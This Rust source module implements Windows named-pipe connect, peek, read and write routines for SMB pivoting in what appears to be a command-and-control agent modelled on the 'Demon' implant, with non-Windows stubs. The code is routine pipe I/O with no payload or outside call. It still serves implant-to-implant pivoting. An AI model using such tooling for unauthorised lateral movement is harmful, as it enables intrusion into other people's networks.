//! Native named-pipe I/O for SMB pivot connections.
//!
//! On Windows, wraps Win32 APIs (`CreateFileW`, `ReadFile`, `WriteFile`,
//! `PeekNamedPipe`, `DisconnectNamedPipe`, `CloseHandle`).
//!
//! On all other platforms a lightweight stub is provided so the rest of the
//! pivot module compiles and returns appropriate error responses at runtime.

use super::codec::PipeError;

/// Maximum size of a single named-pipe read/write buffer (64 KiB).
///
/// Mirrors the Demon's `PIPE_BUFFER_MAX` constant.
#[cfg(windows)]
const PIPE_BUFFER_MAX: usize = 0x10000;

// ─── Windows native pipe operations ─────────────────────────────────────────

#[cfg(windows)]
#[allow(unsafe_code)]
mod native {
    use super::*;
    use windows_sys::Win32::Foundation::{
        CloseHandle, ERROR_BROKEN_PIPE as WIN32_ERROR_BROKEN_PIPE, ERROR_PIPE_BUSY, GENERIC_READ,
        GENERIC_WRITE, GetLastError, INVALID_HANDLE_VALUE,
    };
    use windows_sys::Win32::Storage::FileSystem::{
        CreateFileW, OPEN_EXISTING, ReadFile, WriteFile,
    };
    use windows_sys::Win32::System::Pipes::{DisconnectNamedPipe, PeekNamedPipe, WaitNamedPipeW};

    pub const ERROR_INVALID_PARAMETER: u32 = 87;

    /// Connect to a named pipe and read the child agent's init packet.
    ///
    /// Returns the pipe handle and the raw init data on success.
    pub fn pipe_connect(pipe_name_utf16: &[u8]) -> Result<(usize, Vec<u8>), PipeError> {
        let wide: Vec<u16> =
            pipe_name_utf16.chunks_exact(2).map(|b| u16::from_le_bytes([b[0], b[1]])).collect();

        // Ensure NUL-terminated for CreateFileW.
        let mut wide_nul = wide.clone();
        if wide_nul.last().is_none_or(|&c| c != 0) {
            wide_nul.push(0);
        }

        let handle = unsafe {
            CreateFileW(
                wide_nul.as_ptr(),
                GENERIC_READ | GENERIC_WRITE,
                0,
                std::ptr::null(),
                OPEN_EXISTING,
                0,
                std::ptr::null_mut() as _,
            )
        };

        if handle == INVALID_HANDLE_VALUE {
            let err = unsafe { GetLastError() };
            if err == ERROR_PIPE_BUSY {
                // Wait up to 5 seconds for the pipe to become available.
                let ok = unsafe { WaitNamedPipeW(wide_nul.as_ptr(), 5000) };
                if ok == 0 {
                    let err2 = unsafe { GetLastError() };
                    return Err(PipeError::new(err2, "WaitNamedPipeW failed"));
                }
                // Retry CreateFileW after wait.
                let handle2 = unsafe {
                    CreateFileW(
                        wide_nul.as_ptr(),
                        GENERIC_READ | GENERIC_WRITE,
                        0,
                        std::ptr::null(),
                        OPEN_EXISTING,
                        0,
                        std::ptr::null_mut() as _,
                    )
                };
                if handle2 == INVALID_HANDLE_VALUE {
                    let err3 = unsafe { GetLastError() };
                    return Err(PipeError::new(err3, "CreateFileW retry failed"));
                }
                return read_init_data(handle2 as usize);
            }
            return Err(PipeError::new(err, "CreateFileW failed"));
        }

        read_init_data(handle as usize)
    }

    /// Read the initial data from a freshly connected pipe (the child's init
    /// header).  Loops on PeekNamedPipe until data arrives.
    fn read_init_data(handle: usize) -> Result<(usize, Vec<u8>), PipeError> {
        loop {
            let mut bytes_available: u32 = 0;
            let ok = unsafe {
                PeekNamedPipe(
                    handle as _,
                    std::ptr::null_mut(),
                    0,
                    std::ptr::null_mut(),
                    &mut bytes_available,
                    std::ptr::null_mut(),
                )
            };
            if ok == 0 {
                let err = unsafe { GetLastError() };
                unsafe { CloseHandle(handle as _) };
                return Err(PipeError::new(err, "PeekNamedPipe failed during init read"));
            }
            if bytes_available > 0 {
                let mut buf = vec![0u8; bytes_available as usize];
                let mut bytes_read: u32 = 0;
                let ok = unsafe {
                    ReadFile(
                        handle as _,
                        buf.as_mut_ptr().cast(),
                        bytes_available,
                        &mut bytes_read,
                        std::ptr::null_mut(),
                    )
                };
                if ok == 0 {
                    let err = unsafe { GetLastError() };
                    unsafe { CloseHandle(handle as _) };
                    return Err(PipeError::new(err, "ReadFile failed during init read"));
                }
                buf.truncate(bytes_read as usize);
                return Ok((handle, buf));
            }
            // Brief yield to avoid busy-spinning.
            std::thread::sleep(std::time::Duration::from_millis(10));
        }
    }

    /// Peek a named pipe for available data.  Returns the number of bytes
    /// available, or a [`PipeError`] on failure.
    pub fn pipe_peek(handle: usize) -> Result<usize, PipeError> {
        let mut bytes_available: u32 = 0;
        let ok = unsafe {
            PeekNamedPipe(
                handle as _,
                std::ptr::null_mut(),
                0,
                std::ptr::null_mut(),
                &mut bytes_available,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            let err = unsafe { GetLastError() };
            if err == WIN32_ERROR_BROKEN_PIPE {
                return Err(PipeError::broken_pipe(err, "pipe broken"));
            }
            return Err(PipeError::new(err, "PeekNamedPipe failed"));
        }
        Ok(bytes_available as usize)
    }

    /// Read a complete Demon packet from the pipe.
    ///
    /// The first 4 bytes (big-endian) contain the packet size; the total read
    /// is `size + 4`.  If `available` is less than 4, peeks again to get the
    /// full size header first.
    pub fn pipe_read_packet(handle: usize, available: usize) -> Result<Vec<u8>, PipeError> {
        if available < 4 {
            return Err(PipeError::new(0, "not enough data for size header"));
        }

        // Peek the first 4 bytes to determine packet length.
        let mut size_buf = [0u8; 4];
        let mut bytes_available: u32 = 0;
        let ok = unsafe {
            PeekNamedPipe(
                handle as _,
                size_buf.as_mut_ptr().cast(),
                4,
                std::ptr::null_mut(),
                &mut bytes_available,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(PipeError::new(err, "PeekNamedPipe size header failed"));
        }

        let packet_body_len = u32::from_be_bytes(size_buf) as usize;
        let total_len = packet_body_len + 4; // size field + body

        let mut buf = vec![0u8; total_len];
        let mut bytes_read: u32 = 0;
        let ok = unsafe {
            ReadFile(
                handle as _,
                buf.as_mut_ptr().cast(),
                total_len as u32,
                &mut bytes_read,
                std::ptr::null_mut(),
            )
        };
        if ok == 0 {
            let err = unsafe { GetLastError() };
            return Err(PipeError::new(err, "ReadFile packet failed"));
        }
        buf.truncate(bytes_read as usize);
        Ok(buf)
    }

    /// Write data to a named pipe, splitting into PIPE_BUFFER_MAX-sized chunks.
    pub fn pipe_write(handle: usize, data: &[u8]) -> Result<(), PipeError> {
        let mut total: usize = 0;
        while total < data.len() {
            let chunk_size = (data.len() - total).min(PIPE_BUFFER_MAX);
            let mut written: u32 = 0;
            let ok = unsafe {
                WriteFile(
                    handle as _,
                    data[total..].as_ptr().cast(),
                    chunk_size as u32,
                    &mut written,
                    std::ptr::null_mut(),
                )
            };
            if ok == 0 {
                let err = unsafe { GetLastError() };
                return Err(PipeError::new(err, "WriteFile failed"));
            }
            total += written as usize;
        }
        Ok(())
    }

    /// Disconnect and close a named pipe handle.
    pub fn pipe_disconnect_and_close(handle: usize) {
        unsafe {
            DisconnectNamedPipe(handle as _);
            CloseHandle(handle as _);
        }
    }

    /// Close a pipe handle without disconnecting.
    pub fn pipe_close(handle: usize) {
        unsafe {
            CloseHandle(handle as _);
        }
    }
}

// ─── Non-Windows stubs ──────────────────────────────────────────────────────

#[cfg(not(windows))]
mod native {
    use super::*;

    pub const ERROR_INVALID_PARAMETER: u32 = 87;

    pub fn pipe_connect(_pipe_name_utf16: &[u8]) -> Result<(usize, Vec<u8>), PipeError> {
        Err(PipeError::new(0, "SMB pivot not supported on this platform"))
    }

    pub fn pipe_peek(_handle: usize) -> Result<usize, PipeError> {
        Ok(0) // no data ever available on stubs
    }

    pub fn pipe_read_packet(_handle: usize, _available: usize) -> Result<Vec<u8>, PipeError> {
        Err(PipeError::new(0, "SMB pivot not supported on this platform"))
    }

    pub fn pipe_write(_handle: usize, _data: &[u8]) -> Result<(), PipeError> {
        Err(PipeError::new(0, "SMB pivot not supported on this platform"))
    }

    pub fn pipe_disconnect_and_close(_handle: usize) {}

    pub fn pipe_close(_handle: usize) {}
}

pub(super) use native::{
    ERROR_INVALID_PARAMETER, pipe_close, pipe_connect, pipe_disconnect_and_close, pipe_peek,
    pipe_read_packet, pipe_write,
};
